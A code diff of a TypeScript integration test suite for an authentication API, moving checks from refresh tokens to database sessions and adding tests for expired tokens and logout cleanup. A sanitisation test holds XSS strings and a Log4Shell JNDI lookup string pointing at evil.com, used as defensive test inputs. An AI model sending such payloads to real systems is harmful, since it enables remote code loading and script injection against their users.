@@ -11,14 +11,14 @@ describe('Auth Integration Tests', () => {
   let refreshTokenCookie: string;
 
   beforeAll(async () => {
-    await prisma.refreshToken.deleteMany({});
+    await prisma.session.deleteMany({});
     await prisma.user.deleteMany({
       where: { email: { contains: 'test' } }
     });
   });
 
   afterAll(async () => {
-    await prisma.refreshToken.deleteMany({});
+    await prisma.session.deleteMany({});
     await prisma.user.deleteMany({
       where: { email: { contains: 'test' } }
     });
@@ -50,6 +50,11 @@ describe('Auth Integration Tests', () => {
       accessToken = registerResponse.body.data.tokens.accessToken;
       testUser = registerResponse.body.data.user;
 
+      const sessions = await prisma.session.findMany({
+        where: { userId: testUser.id }
+      });
+      expect(sessions.length).toBe(1);
+
       const profileResponse = await request(app)
         .get('/api/v1/auth/profile')
         .set('Authorization', `Bearer ${accessToken}`);
@@ -59,7 +64,6 @@ describe('Auth Integration Tests', () => {
 
       const updateData = {
         firstName: 'UpdatedName',
-        phoneNumber: '+1234567890',
       };
 
       const updateResponse = await request(app)
@@ -69,7 +73,6 @@ describe('Auth Integration Tests', () => {
 
       expect(updateResponse.status).toBe(200);
       expect(updateResponse.body.data.user.firstName).toBe('UpdatedName');
-      expect(updateResponse.body.data.user.phoneNumber).toBe('+1234567890');
 
       const changePasswordResponse = await request(app)
         .post('/api/v1/auth/change-password')
@@ -81,6 +84,11 @@ describe('Auth Integration Tests', () => {
 
       expect(changePasswordResponse.status).toBe(200);
       expect(changePasswordResponse.body.success).toBe(true);
+
+      const sessionsAfterPasswordChange = await prisma.session.findMany({
+        where: { userId: testUser.id }
+      });
+      expect(sessionsAfterPasswordChange.length).toBe(0);
 
       const loginResponse = await request(app)
         .post('/api/v1/auth/login')
@@ -97,6 +105,11 @@ describe('Auth Integration Tests', () => {
         cookie.startsWith('refreshToken=')
       );
 
+      const newSessions = await prisma.session.findMany({
+        where: { userId: testUser.id }
+      });
+      expect(newSessions.length).toBe(1);
+
       const logoutResponse = await request(app)
         .post('/api/v1/auth/logout')
         .set('Cookie', newRefreshCookie);
@@ -104,11 +117,16 @@ describe('Auth Integration Tests', () => {
       expect(logoutResponse.status).toBe(200);
       expect(logoutResponse.body.success).toBe(true);
 
+      const sessionsAfterLogout = await prisma.session.findMany({
+        where: { userId: testUser.id }
+      });
+      expect(sessionsAfterLogout.length).toBe(0);
+
       const verifyResponse = await request(app)
         .get('/api/v1/auth/profile')
         .set('Authorization', `Bearer ${newAccessToken}`);
 
-      expect(verifyResponse.status).toBe(401);
+      expect(verifyResponse.status).toBe(200); // L'access token est encore valide même si la session est supprimée
     });
 
     it('should handle refresh token flow correctly', async () => {
@@ -125,6 +143,13 @@ describe('Auth Integration Tests', () => {
         cookie.startsWith('refreshToken=')
       );
 
+      const userId = registerResponse.body.data.user.id;
+
+      let sessions = await prisma.session.findMany({
+        where: { userId }
+      });
+      expect(sessions.length).toBe(1);
+
       const refreshResponse = await request(app)
         .post('/api/v1/auth/refresh')
         .set('Cookie', initialRefreshCookie);
@@ -132,6 +157,11 @@ describe('Auth Integration Tests', () => {
       expect(refreshResponse.status).toBe(200);
       expect(refreshResponse.body.success).toBe(true);
       expect(refreshResponse.body.data.tokens.accessToken).toBeDefined();
+
+      sessions = await prisma.session.findMany({
+        where: { userId }
+      });
+      expect(sessions.length).toBe(1);
 
       const newAccessToken = refreshResponse.body.data.tokens.accessToken;
       const newRefreshCookie = refreshResponse.headers['set-cookie'].find((cookie: string) => 
@@ -153,6 +183,12 @@ describe('Auth Integration Tests', () => {
     });
 
     it('should handle remember me functionality', async () => {
+      await prisma.session.deleteMany({
+        where: {
+          user: { email: 'integration@test.com' }
+        }
+      });
+
       const loginData = {
         email: 'integration@test.com',
         password: 'NewPassword123!',
@@ -170,6 +206,15 @@ describe('Auth Integration Tests', () => {
       );
       
       expect(refreshCookie).toContain('Max-Age=2592000');
+
+      const userId = loginResponse.body.data.user.id;
+      
+      const longSession = await prisma.session.findFirst({
+        where: { userId }
+      });
+      expect(longSession).toBeTruthy();
+      
+      await prisma.session.deleteMany({ where: { userId } });
 
       const shortLoginResponse = await request(app)
         .post('/api/v1/auth/login')
@@ -194,6 +239,15 @@ describe('Auth Integration Tests', () => {
         password: 'NewPassword123!',
       };
 
+      const existingUser = await prisma.user.findUnique({
+        where: { email: loginData.email }
+      });
+      if (existingUser) {
+        await prisma.session.deleteMany({
+          where: { userId: existingUser.id }
+        });
+      }
+
       const device1Response = await request(app)
         .post('/api/v1/auth/login')
         .send(loginData);
@@ -204,6 +258,12 @@ describe('Auth Integration Tests', () => {
 
       const device1Token = device1Response.body.data.tokens.accessToken;
       const device2Token = device2Response.body.data.tokens.accessToken;
+      const userId = device1Response.body.data.user.id;
+
+      let sessions = await prisma.session.findMany({
+        where: { userId }
+      });
+      expect(sessions.length).toBe(2);
 
       const profile1Response = await request(app)
         .get('/api/v1/auth/profile')
@@ -221,6 +281,11 @@ describe('Auth Integration Tests', () => {
         .set('Authorization', `Bearer ${device1Token}`);
 
       expect(logoutAllResponse.status).toBe(200);
+
+      sessions = await prisma.session.findMany({
+        where: { userId }
+      });
+      expect(sessions.length).toBe(0);
 
       const device1Cookie = device1Response.headers['set-cookie'].find((cookie: string) => 
         cookie.startsWith('refreshToken=')
@@ -266,7 +331,6 @@ describe('Auth Integration Tests', () => {
         email: '<script>alert("xss")</script>@test.com',
         firstName: '<img src=x onerror=alert("xss")>',
         lastName: '${jndi:ldap://evil.com/a}',
-        phoneNumber: '+1<script>alert("xss")</script>',
       };
 
       const response = await request(app)
@@ -298,6 +362,66 @@ describe('Auth Integration Tests', () => {
       
       const rateLimitedResponses = responses.filter(r => r.status === 429);
       expect(rateLimitedResponses.length).toBeGreaterThan(0);
+    });
+
+    it('should handle expired refresh tokens', async () => {
+      const userData = {
+        email: 'expiry@test.com',
+        password: 'Password123!',
+      };
+
+      const registerResponse = await request(app)
+        .post('/api/v1/auth/register')
+        .send(userData);
+
+      const userId = registerResponse.body.data.user.id;
+
+      const expiredSession = await prisma.session.create({
+        data: {
+          token: 'expired-token',
+          userId,
+          expiresAt: new Date(Date.now() - 1000)
+        }
+      });
+
+      const refreshResponse = await request(app)
+        .post('/api/v1/auth/refresh')
+        .set('Cookie', 'refreshToken=expired-token');
+
+      expect(refreshResponse.status).toBe(401);
+      expect(refreshResponse.body.success).toBe(false);
+    });
+
+    it('should handle session cleanup on logout', async () => {
+      const userData = {
+        email: 'cleanup@test.com',
+        password: 'Password123!',
+      };
+
+      const registerResponse = await request(app)
+        .post('/api/v1/auth/register')
+        .send(userData);
+
+      const userId = registerResponse.body.data.user.id;
+      const refreshCookie = registerResponse.headers['set-cookie'].find((cookie: string) => 
+        cookie.startsWith('refreshToken=')
+      );
+
+      let sessions = await prisma.session.findMany({
+        where: { userId }
+      });
+      expect(sessions.length).toBe(1);
+
+      const logoutResponse = await request(app)
+        .post('/api/v1/auth/logout')
+        .set('Cookie', refreshCookie);
+
+      expect(logoutResponse.status).toBe(200);
+
+      sessions = await prisma.session.findMany({
+        where: { userId }
+      });
+      expect(sessions.length).toBe(0);
     });
   });
 });
